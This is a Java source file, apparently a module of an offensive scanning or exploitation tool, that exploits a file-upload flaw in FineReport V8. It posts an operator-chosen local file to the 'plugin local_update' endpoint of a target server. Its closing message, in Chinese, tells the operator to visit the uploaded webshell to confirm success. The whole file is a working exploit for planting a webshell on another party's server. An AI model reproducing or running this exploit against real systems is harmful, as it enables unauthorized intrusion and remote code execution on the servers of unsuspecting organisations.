package com.droplab.Controller.FineReport.Service;

import com.droplab.Utils.CommonUtils;
import com.droplab.Utils.HttpUtils;
import com.droplab.Utils.InfoUtils;
import com.droplab.Utils.ResponseUtils;
import com.droplab.service.BugService;
import org.jsoup.Connection;

import java.io.File;
import java.util.HashMap;
import java.util.Iterator;

public class V8FileUploadTwo extends BugService {
    private final String contentPath = "/WebReport/ReportServer?op=plugin&cmd=local_update&filename=a.png&width=32&height=32";

    @Override
    public Object run(String type) {
        try {
            if (params.size() > 0) {
                String url = "";
                String filepath = null;
                Iterator<String> iterator = params.keySet().iterator();
                while (iterator.hasNext()) {
                    String key = iterator.next();
                    if (key.equals("url")) {
                        url = params.get(key);
                    } else if (key.equals("filepath")) {
                        filepath = params.get(key);
                    }
                }
                if (!url.equals("")) {
                    ResponseUtils response = new ResponseUtils();
                    HashMap fileMap = new HashMap(); //文件上传流
                    fileMap.put("Files", new File(filepath));
                    HashMap<String, String> headers = new HashMap<>();
                    CommonUtils.hashMapClone(InfoUtils.headers, headers);
                    headers.put("Referer", url);
                    Connection.Response response1 = HttpUtils.post(url + contentPath, headers, null, fileMap);
                    String body = response1.body();
                    response.setMessage("上传结束，请访问webshell查看是否上传成功，不成功可以尝试携带cookie信息重新上传。");
                    return response;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
